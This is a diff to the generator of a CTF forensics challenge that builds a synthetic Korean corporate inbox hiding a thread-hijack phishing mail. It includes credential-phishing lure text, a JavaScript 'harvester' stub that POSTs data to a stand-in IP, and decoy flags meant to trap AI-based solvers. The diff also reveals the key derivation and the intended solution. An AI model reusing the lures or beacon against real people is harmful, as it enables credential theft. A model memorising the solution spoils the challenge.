@@ -23,14 +23,13 @@ KCTF 2026 MISC — inbox-triage
        - 내부 발신자가 처음 끼어드는 스레드에 답장      -> '외부인' 조건 탈락
      두 조건의 **교집합** 이 유일해야 한다.
 
-  2. 키는 스레드 루트를 걸어가야만 얻을 수 있다.
-     초안은 XOR 키가 그 메일 안의 도메인이라, 첨부를 grep 해서 각 메일의 도메인을
-     대입하는 것만으로 뚫렸다 (600통 분류도 그래프 분석도 건너뛴다).
-     지금은 키가 **하이재킹된 스레드 루트의 Message-ID 로컬파트 + '@' + 위조 도메인**
-     이다. 이 문자열은 코퍼스 어디에도 그대로 존재하지 않는다.
-       - 루트를 얻으려면 In-Reply-To 를 따라 끝까지 거슬러 올라가야 한다
-         (하이재킹 메일에는 References 헤더를 넣지 않는다)
-       - 위조 도메인을 정확히 집어내야 한다 (호모글리프 rn/m)
+  2. 키는 조상 체인 전체를 걸어야만 얻을 수 있다. (열거 불가여야 한다)
+     초안 1: 키가 그 메일 안의 도메인   -> 첨부 grep + 도메인 대입으로 끝
+     초안 2: 키가 루트 Message-ID 로컬파트 + '@' + 위조 도메인
+             -> 로컬파트 600개 x 첨부 66개 = 39,600회 대입이 0.1초.
+                블라인드 검증에서 실측되었고, 의도된 경로보다 싸다.
+     지금은 키 재료가 **조상 Message-ID 전체(루트~부모)를 이어붙인 것 + 위조 도메인**
+     이다. 조합적으로 열거할 수 없고 그래프를 실제로 걸어야만 나온다.
 
   3. 난독화 첨부는 65통이 갖는다.
      5통만 가지면 "첨부 있는 메일 찾기" 로 후보가 5개로 줄어 분류 과정이 통째로
@@ -50,7 +49,7 @@ KCTF 2026 MISC — inbox-triage
      정상 답장의 상당수도 직전 부모만 담은 짧은 References 를 갖게 해서
      진짜의 형태가 특별해 보이지 않도록 한다.
 
-  4. 암호는 반복키 XOR 이 아니다.
+  6. 암호는 반복키 XOR 이 아니다.
      평문이 KCTF{ 로 시작하므로 반복키 XOR 은 crib-drag 로 즉사한다.
      SHA256 카운터 모드 키스트림을 쓴다 (순수 파이썬 15줄로 구현 가능,
      외부 의존성 없음).
@@ -161,6 +160,16 @@ SPAM_DOMAINS = [
     "norite-sytems.com", "n0rite-systems.com",
 ]
 
+# 스팸 본문. 절반 이상을 한글로 둔다 — 미끼가 전부 영문이면
+# '첨부 보유 AND 본문에 한글' 이라는 불리언 두 개로 진짜가 특정된다.
+SPAM_BODY_EN = ("Dear user,\n\nYour immediate action is required. Please open "
+                "the attached document and verify your credentials to avoid "
+                "service interruption.\n\nRegards,\nAccount Team\n")
+SPAM_BODY_KO = ("안녕하세요,\n\n계정 보안 정책 변경에 따라 인증 정보 재확인이 "
+                "필요합니다.\n첨부된 문서를 열어 절차를 완료해 주시기 바랍니다.\n"
+                "기한 내 처리되지 않으면 서비스 이용이 제한될 수 있습니다.\n\n"
+                "감사합니다.\n계정관리팀\n")
+
 # 모델에 통째로 던지는 솔버를 잡기 위한 미끼. 눈으로 보면 가짜인 게 명확해야
 # 한다 (스코어보드 스프레이 방지). 자동 요약에는 그럴듯하게 걸린다.
 DECOY_FLAGS = [
@@ -262,7 +271,7 @@ class Gen:
 
 # ---------------------------------------------------------------- 본문 생성
 
-def make_body(g, sysname, proj, n):
+def make_body(g, sysname, proj, n, signer=None):
     r = g.r
     parts = [r.choice(BODY_OPEN), ""]
     for _ in range(r.randint(1, 3)):
@@ -270,8 +279,11 @@ def make_body(g, sysname, proj, n):
         parts.append(t.format(sys=sysname, proj=proj,
                               who=r.choice(PEOPLE)[0],
                               tick=r.randint(1000, 9999)))
+    # 서명은 반드시 발신자와 일치해야 한다. 어긋나면 BEC 사칭 단서처럼 보여서
+    # 코퍼스 전체가 거대한 미끼가 된다 (블라인드 검증에서 지적됨).
+    who = signer[0] if signer else r.choice(PEOPLE)[0]
     parts += ["", r.choice(BODY_CLOSE), "",
-              "--", f"{r.choice(PEOPLE)[0]} / Norite Systems"]
+              "--", f"{who} / Norite Systems"]
     return "\n".join(parts)
 
 
@@ -283,17 +295,23 @@ HARVESTER_JS = """\
   var host = "%s";
   var blob = [%s];
 
-  // beacon key = <hijacked thread ROOT message-id local part> + "@" + host
-  // (operator note: pull the root id by walking In-Reply-To back to the
-  //  first message of the thread we injected into. do NOT use our own
-  //  In-Reply-To value, that is mid-thread.)
-  function key(rootLocalPart){ return rootLocalPart + "@" + host; }
+  // beacon key material = EVERY Message-ID on this message's ancestor chain,
+  // ROOT FIRST, ending with the message we replied to. Each id exactly as it
+  // appears in the header, angle brackets included, joined with ",".
+  // Then "|" then host.
+  //
+  //   MATERIAL = "<root>,<...>,<parent>" + "|" + host
+  //   key      = sha256(MATERIAL)
+  //
+  // (operator note: walk In-Reply-To all the way up. our own In-Reply-To is
+  //  mid-thread and the References we send is truncated on purpose, so the
+  //  chain is not readable off any single header.)
 
-  // keystream = sha256(key + i) concatenated, i = 0,1,2,...
+  // keystream = sha256(key + str(i)) concatenated, i = 0,1,2,...
   // plain[j] = blob[j] ^ keystream[j]
-  function decode(k){ /* sha256-ctr, see keystream() */ }
+  function decode(k){ /* sha256-ctr */ }
 
-  fetch("https://198.51.100.77/collect", {method:"POST", body:decode(key)});
+  fetch("https://198.51.100.77/collect", {method:"POST", body:decode(0)});
 })();
 """
 
@@ -370,7 +388,7 @@ def generate():
             m = g.build(
                 frm=g.addr(sender), to=others,
                 subject=subj if k == 0 else "Re: " + subj,
-                body=make_body(g, sysname, proj, k), dt=t, mid=mid,
+                body=make_body(g, sysname, proj, k, signer=sender), dt=t, mid=mid,
                 in_reply_to=chain[-1][0] if chain else None,
                 references=use_refs)
             g.emit(m)
@@ -422,7 +440,7 @@ def generate():
             frm=g.addr(outsider), to=th["members"],
             subject="Re: " + th["subject"],
             body="지나가다 봤는데 한 가지 덧붙입니다.\n\n"
-                 + make_body(g, th["sys"], th["proj"], 0),
+                 + make_body(g, th["sys"], th["proj"], 0, signer=outsider),
             dt=t, mid=mid, in_reply_to=th["chain"][-1][0])
         g.emit(m)
 
@@ -430,11 +448,12 @@ def generate():
     for _ in range(24):
         t += timedelta(minutes=r.randint(60, 800))
         sysname = r.choice(SYSTEMS)
+        who = r.choice(PEOPLE)
         g.emit(g.build(
-            frm=g.addr(r.choice(PEOPLE)),
+            frm=g.addr(who),
             to=[f"all-staff@{CORP}"],
             subject=f"[공지] {sysname} 정기 점검 안내",
-            body=make_body(g, sysname, r.choice(PROJECTS), 0),
+            body=make_body(g, sysname, r.choice(PROJECTS), 0, signer=who),
             dt=t, mid=g.mid()))
 
     # ---- 명백한 스팸/피싱 (전부 난독화 첨부 보유)
@@ -445,6 +464,7 @@ def generate():
     #   18~31번 : 외부 참여자가 있는 벤더 스레드에 매달린다 ('내부 전용' 탈락)
     #   나머지  : 단독 메일
     vendor_threads = [th for th in threads if th["external"]]
+    internal_pool = [th for th in threads if not th["external"]]
     decoy_slots = list(range(65))
     r.shuffle(decoy_slots)
     fake_slots = set(decoy_slots[:len(DECOY_FLAGS)])
@@ -460,6 +480,13 @@ def generate():
         subj = r.choice(SPAM_SUBJECTS).format(n=r.randint(10000, 99999))
         recipients = [g.addr(r.choice(PEOPLE)).split("<")[1].rstrip(">")]
 
+        # 수신자가 여럿이면서 전원 사내인 메일을 미끼에도 만들어 둔다.
+        # 이게 없으면 '수신자 2명 이상 AND 전원 사내' 라는 불리언 두 개로
+        # 진짜가 특정된다 (실제로 감사에서 걸렸다).
+        if r.random() < 0.45:
+            recipients = [g.addr(p).split("<")[1].rstrip(">")
+                          for p in r.sample(PEOPLE, r.randint(2, 4))]
+
         if i < 18:
             # 존재하지 않는 Message-ID 를 가리키는 답장
             ghost = hashlib.sha1(f"ghost{i}".encode()).hexdigest()[:16]
@@ -473,16 +500,25 @@ def generate():
             recipients = th["members"]
             if r.random() < 0.5:
                 refs_hdr = [irt]
+        elif i < 42:
+            # 사내 주소를 위조해 내부 전용 스레드에 매달린 답장.
+            # 이게 없으면 '첨부 보유 AND References 1개 AND 수신자 전원 사내'
+            # 처럼 그래프가 전혀 필요 없는 불리언 3개로 진짜가 특정된다.
+            # 이 미끼들은 발신 도메인이 사내라서 '외부인' 조건에서 탈락한다.
+            th = internal_pool[(i - 32) % len(internal_pool)]
+            irt = th["chain"][-1][0]
+            subj = "Re: " + th["subject"]
+            recipients = th["members"]
+            refs_hdr = [irt]
+            dom = CORP
 
         g.emit(g.build(
-            frm=f'"{r.choice(["Account Team","IT Support","Billing","Security"])}"'
-                f' <{r.choice(["no-reply","admin","service","alert"])}@{dom}>',
+            frm=(f'"IT Helpdesk" <helpdesk@{dom}>' if dom == CORP else
+                 f'"{r.choice(["Account Team","IT Support","Billing","Security"])}"'
+                 f' <{r.choice(["no-reply","admin","service","alert"])}@{dom}>'),
             to=recipients,
             subject=subj,
-            body="Dear user,\n\nYour immediate action is required. "
-                 "Please open the attached document and verify your "
-                 "credentials to avoid service interruption.\n\n"
-                 "Regards,\nAccount Team\n",
+            body=(SPAM_BODY_KO if r.random() < 0.55 else SPAM_BODY_EN),
             dt=t, mid=f"<{mid_local}@{dom}>",
             in_reply_to=irt, references=refs_hdr,
             external_ip=f"192.0.2.{r.randint(2, 250)}",
@@ -524,15 +560,35 @@ def add_hijack(g, threads):
              if not th["external"] and len(th["chain"]) >= 5]
     target = cands[r.randrange(len(cands))]
 
-    root_mid = target["chain"][0][0]                 # <hex@norite-systems.com>
-    root_local = root_mid.strip("<>").split("@")[0]
-    key = f"{root_local}@{SPOOF}"
-
     parent_mid = target["chain"][-2][0]               # 스레드 중간에 매단다
+
+    # 조상 체인 전체(루트 ~ 부모)를 키 재료로 쓴다.
+    #
+    # 초안은 '루트 Message-ID 로컬파트 + @ + 위조도메인' 이었는데, 이건 열거 가능하다.
+    # 블라인드 검증에서 실측된 결과: 코퍼스의 로컬파트 600개 x 첨부 66개 =
+    # 39,600회 대입이 0.1초에 끝나고 정확히 같은 평문 5개가 나온다.
+    # 의도된 경로보다 싸므로 '허용된 대체 경로' 로 넘길 수 없다.
+    #
+    # 조상 체인 전체는 조합적으로 열거할 수 없다. 그래프를 실제로 걸어야만 나온다.
+    ancestors = [m for m, _, _ in target["chain"][:-1]]   # 루트 .. 부모
+    key = ",".join(ancestors) + "|" + SPOOF
     js = HARVESTER_JS % (
         SPOOF,
         ",".join(str(b) for b in encrypt(FLAG.encode(), key)),
     )
+
+    # 조상들의 References 를 직전 부모 하나로 잘라둔다.
+    # 그러지 않으면 부모의 References[0] 이 곧 루트라서, 재귀 없이 한 번의
+    # 조회로 체인이 통째로 드러난다 (블라인드 검증에서 지목된 우회 B).
+    by_mid = {mid: m for mid, m in g.mails}
+    prev = None
+    for mid, _, _ in target["chain"]:
+        m_ = by_mid.get(mid)
+        if m_ is not None and m_["References"]:
+            del m_["References"]
+            if prev:
+                m_["References"] = prev
+        prev = mid
     att = ("VPN_Cert_Renewal.html", make_attachment(g, js))
 
     dt = target["chain"][-1][2] + timedelta(minutes=37)
@@ -550,10 +606,16 @@ def add_hijack(g, threads):
         in_reply_to=parent_mid,
         references=[parent_mid],         # 루트는 담기지 않는다
         external_ip="203.0.113.201",
-        spf="fail",
+        # 위조 도메인은 공격자가 소유하므로 그 도메인 기준 SPF 는 통과한다.
+        # 현실적이기도 하고, "필터를 통과했으니 깨끗해 보였을 것" 이라는
+        # 문제 설명을 참으로 만든다. SPF 로 거르려는 접근은 오히려 손해를 본다.
+        spf="pass",
         attachment=att)
+    del m["X-Norite-Spam-Score"]
+    m["X-Norite-Spam-Score"] = f"{r.uniform(0.0, 0.6):.1f}"
     g.emit(m)
-    return {"key": key, "root_mid": root_mid, "parent_mid": parent_mid,
+    return {"key": key, "root_mid": target["chain"][0][0],
+            "parent_mid": parent_mid,
             "subject": target["subject"], "mid": m["Message-ID"]}
 
 
@@ -566,11 +628,12 @@ def main():
     while len(g.mails) < N_TOTAL:
         t = T0 + timedelta(minutes=r.randint(0, 40000))
         sysname = r.choice(SYSTEMS)
+        who = r.choice(PEOPLE)
         g.emit(g.build(
-            frm=g.addr(r.choice(PEOPLE)),
+            frm=g.addr(who),
             to=[g.addr(r.choice(PEOPLE)).split("<")[1].rstrip(">")],
             subject=f"{sysname} 관련 문의", dt=t, mid=g.mid(),
-            body=make_body(g, sysname, r.choice(PROJECTS), 0)))
+            body=make_body(g, sysname, r.choice(PROJECTS), 0, signer=who)))
     if len(g.mails) > N_TOTAL:
         raise SystemExit(f"메일이 {len(g.mails)}통 — N_TOTAL 초과")
 
